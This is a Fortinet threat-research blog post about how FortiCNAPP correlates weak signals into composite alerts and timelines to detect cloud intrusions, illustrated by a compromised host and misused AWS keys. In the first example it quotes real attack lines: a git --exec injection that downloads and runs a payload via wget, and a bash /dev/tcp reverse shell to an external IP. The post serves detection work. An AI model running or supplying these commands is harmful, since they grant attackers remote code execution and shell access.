@@ -1,0 +1,185 @@
+Categories
+
+
+
+Fortinet News & Updates
+
+
+
+
+FortiGuard Labs Threat Research
+
+
+
+
+Industry Trends & Insights
+
+
+
+
+Life at Fortinet
+
+
+
+
+Partners
+
+
+
+
+Customer Success Stories
+
+
+
+
+PSIRT Blogs
+
+Fortinet News & Updates
+FortiGuard Labs Threat Research
+Industry Trends & Insights
+Life at Fortinet
+Partners
+Customer Success Stories
+PSIRT Blogs
+Fortinet News & Updates
+FortiGuard Labs Threat Research
+Industry Trends & Insights
+Life at Fortinet
+Partners
+Customer Success Stories
+PSIRT Blogs
+CISO Collective
+Subscribe
+FortiGuard Labs Threat Research
+Improving Cloud Intrusion Detection and Triage with FortiCNAPP Composite Alerts
+Detect Cloud Intrusions Faster with Correlated Alerts and Contextual Timelines in FortiCNAPP
+
+Article Contents
+Overview
+The Need for Composite Alerts
+Observation Timeline
+Use CasesExample 1Example 2
+Conclusion
+Overview
+Modern cyberattacks targeting cloud environments are increasingly complex and difficult to detect. Attackers often use multi-stage techniques—such as authentication abuse, privilege escalation, command execution, and interaction with cloud-native APIs—to gain and expand access. Each step in this attack chain often mimics legitimate administrative or developer activity, making it extremely difficult to identify malicious intent.
+Typical attacker behaviors—such as logging in from a new IP address, accessing previously unused cloud services, or executing command-line processes—can appear indistinguishable from routine actions by developers, admins, or automation. Complicating matters, there is often no single signature, rule, or event that definitively indicates a compromise has occurred.
+2025 Global Threat Landscape Report
+Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.
+As a result, cloud intrusion detection requires examining multiple signals in context. A single weak signal may be inconclusive. But when multiple anomalies involve the same users, resources, or compute nodes over a short period, the likelihood of a targeted intrusion increases significantly. This behavioral correlation is what separates real attacks—or even penetration testing—from normal workload activity.
+FortiCNAPP addresses this challenge by correlating weak indicators into a coherent picture using Composite Alerts and the Observation Timeline. The sections below examine how these capabilities work in practice, along with real-world examples that illustrate their value in detecting cloud-native intrusions.
+The Need for Composite Alerts
+To improve detection precision and reduce the burden on security analysts, FortiCNAPP has introduced Composite Alerts. This technology identifies intrusions not by detecting a single event, but by aggregating and correlating multiple indicators associated with the same entity over a defined time window.
+Each Composite Alert compiles a series of detections, such as suspicious logins, first-time use of administrative APIs, or anomalous container behavior, and links them to specific cloud resources, user identities, or compute instances. Applying a correlation window also allows FortiCNAPP to detect patterns that emerge over minutes or hours rather than the milliseconds of traditional attacks.
+This approach offers several advantages:
+
+Higher detection fidelity: By correlating multiple corroborating signals, Composite Alerts reduce the false positive rate associated with isolated anomalies.
+Earlier identification: By catching multi-step behavior chains as they develop, FortiCNAPP improves time-to-detection.
+Improved analyst efficiency: Rather than forcing an analyst to assemble individual alerts into a coherent narrative themselves, the Composite Alert structure presents that narrative upfront.
+As a result, security teams can shift away from reactive alert triage and instead engage in informed, prioritized investigation. By presenting correlated signals with contextual metadata and entity linkage, FortiCNAPP enables analysts to focus their time on evaluating credible threats rather than chasing disconnected anomalies, streamlining the path from detection to resolution.
+Observation Timeline
+To reduce mean time to triage (MTTT), FortiCNAPP provides each Composite Alert in the form of an Observation Timeline. This timeline serves as both evidence and explanation, enabling the analyst to quickly understand why the alert was generated, which entities were involved, and what sequence of events took place.
+Each Observation Timeline includes two foundational elements:
+
+Observations: These are the events or behaviors FortiCNAPP has flagged as potentially suspicious within the cloud environment.
+Entities: These include users, machines, containers, IP addresses, cloud services, and other infrastructure components that are tied to the observed behaviors.
+Once FortiCNAPP has identified a primary entity, such as a compromised IAM user, workload, or compute node, it constructs a timeline by aggregating all related observations for that entity across the alert window.
+For each observation, the timeline includes:
+
+Type of behavior detected (e.g., unusual login, API abuse, lateral movement)
+First and last seen timestamps for that behavior relative to the alert window
+Associated metadata, including:
+Source IP addresses and geolocation for login activity
+Cloud service APIs accessed for the first time
+Suspicious or mismatched user agents
+Command-line parameters or executable paths seen for the first time
+Containers or VMs created or modified unexpectedly
+
+Source IP addresses and geolocation for login activity
+Cloud service APIs accessed for the first time
+Suspicious or mismatched user agents
+Command-line parameters or executable paths seen for the first time
+Containers or VMs created or modified unexpectedly
+By presenting these elements in a concise, ordered structure, the timeline equips the user to assess the threat in context. This makes it easier to answer key questions, such as:
+
+Is this activity part of normal operations?
+Does this user typically access this service from this location?
+Is this command commonly used in this environment?
+Are other entities showing similar behavior?
+This structured format reduces cognitive load by eliminating the need for analysts to manually reconstruct sequences of activity from disparate logs. It also minimizes investigative overhead by clearly presenting relevant behaviors and their associated metadata in context, enabling faster escalation, more accurate threat classification, and higher-confidence incident response decisions.
+Use Cases
+Example 1
+The first alert involves a machine monitored by a FortiCNAPP agent that was flagged as potentially compromised.
+Alert Type
+Potentially Compromised Host
+Alert Description
+Host machines may have been compromised. The following entities are suspected. Hosts: ip-10-123-45-67
+Observation Timeline
+The machine suspected of compromise had the hostname ip-10-123-45-67. Additional host details were available to the end user. The timeline begins on May 13 at 12:00 PM, when FortiCNAPP observed a new vulnerable application installed on the host.
+Two days later, on May 15 at 10:00 AM, the system launched several new child applications—processes not previously seen originating from this parent process. At 10:36 AM, the timeline flagged a possible reverse shell command. Inspection of the associated command line confirmed it: the host initiated an outbound connection to a remote system, granting that system interactive shell access—even if the machine was behind a firewall or otherwise unreachable from the internet.
+Further activity that day strengthened the case for compromise. At 12:00 PM, the host contacted a known-bad external domain. At 12:51 PM, it resolved the domain to an internal IP, indicating a successful DNS lookup. By 1:00 PM, it had established an anomalous command-line connection to an external server using wget. This suggests the attacker downloaded and executed malicious code from a remote source. The use of wget with the -qO- flag—which suppresses output and streams the response directly to stdout for execution by a child process—further supports the likelihood of malicious behavior.
+At this stage, the timeline provides strong evidence of compromise. For further validation, analysts could expand the “+19 more” related entities linked to the “New child application launched” detection. Within this expanded set, multiple command lines reveal obfuscated commands designed to download remote code and execute it locally.
+This example:
+/usr/bin/git archive --format=zip --prefix=en --exec=`wget -qO /tmp/QrXErNRt http:// 10.203.118.5:8080/sYdelk;chmod +x /tmp/QrXErNRt;/tmp/QrXErNRt;rm -f /tmp/QrXErNRt` --remote=bOCNVQ/ --
+abuses git and wget to download remote code to a file in the tmp directory, execute it, and then clean it up.
+
+also abuses git, but this time it leverages perl to run an obfuscated script. That obfuscated script, when decoded, is the reverse shell command identified by the syscall detection
+bash -c 0<&189-;exec 189<>/dev/tcp/ 10.203.118.5/4444;sh <&189 >&189 2>&189
+The ability to detect highly obfuscated commands as anomalous and incorporate them into the narrative of a larger suspected attack is a key benefit of FortiCNAPP’s Composite Alerts and of the Observation Timeline feature.
+Example 2
+This second alert involves AWS identities monitored by FortiCNAPP using CloudTrail logs.
+Alert Type
+Potentially Compromised AWS Keys
+Alert Description
+AWS credentials may have been compromised. The following entities are suspected. Users: AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a; Principal Ids: AROAREDACTEDM9V2Q3LXD:firstname.lastname@redactedcompany.com.
+In this case, the entity suspected of compromise was the identity AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a, specifically as used by firstname.lastname@redactedcompany.com, as indicated by the principal_id.
+The timeline began on May 27, when this identity called APIs across 17 AWS regions and 28 different AWS services, suggesting reconnaissance activity. On May 28, the same identity made additional API calls from a previously unseen IP address located outside AWS infrastructure. Over the following two hours, FortiCNAPP observed several additional anomalies associated with this identity, including the use of new services, access to previously used services in new regions, and API calls that resulted in errors. Several of the APIs accessed were sensitive for infrastructure and service discovery.
+The Lacework customer who received this alert confirmed it as a malicious intrusion. What made this case particularly noteworthy was the absence of an obvious “smoking gun.” Unlike the first example, where reverse shell commands and obfuscated payloads clearly indicated malicious activity, this scenario involved a user behaving anomalously over time in ways that resembled legitimate exploration. The suspicious nature of the behavior became apparent only when the events were viewed in aggregate.
+FortiCNAPP’s ability to detect this threat did not rely on a single decisive signal. Instead, it resulted from correlating multiple weak signals into a structured timeline. This allowed analysts to determine that a critical mass of suspicious behavior had occurred.
+This example illustrated the power of Composite Alerts. By aggregating low-signal anomalies that might otherwise be dismissed, FortiCNAPP surfaced a high-fidelity detection—catching the intrusion during the early Discovery phase, before the attacker could escalate privileges or cause damage.
+Conclusion
+Composite Alerts enable security teams to focus on meaningful patterns of behavior that indicate real threats, rather than manually correlating isolated detections. By automatically assembling related signals into a coherent, time-ordered timeline, FortiCNAPP reduces the effort required to identify and respond to cloud-native attacks. Analysts no longer need to reconstruct the narrative from scratch. FortiCNAPP delivers it with supporting evidence and clear entity context. This allows security teams to shift from reactive triage to informed, prioritized investigation.
+By presenting correlated signals with contextual metadata, FortiCNAPP enables your analysts to focus on credible threats rather than chasing unrelated anomalies. In cloud environments, where attacker dwell times are short and lateral movement can occur quickly, timely and structured detection is essential for containing threats before they escalate into breaches or operational disruptions.
+Related Posts
+FortiGuard Labs Threat Research
+A Look into XPC Internals: Reverse Engineering the XPC Objects
+Locky Strikes Another Blow, Diablo6 Variant Starts Spreading Through Spam
+Fake Indian Income Tax Calculator Delivers xRAT Variant
+
+
+
+
+
+
+
+News & Articles
+
+News Releases
+News Articles
+Security Research
+
+Threat Research
+FortiGuard Labs
+Threat Map
+Ransomware Prevention
+Connect With Us
+
+Fortinet Community
+Partner Portal
+Investor Relations
+Product Certifications
+Company
+
+About Us
+Exec Mgmt
+Careers
+Training
+Events
+Industry Awards
+Social Responsibility
+CyberGlossary
+Sitemap
+Blog Sitemap
+Contact Us
+
+(866) 868-3678
+Copyright © 2025 Fortinet, Inc. All Rights Reserved
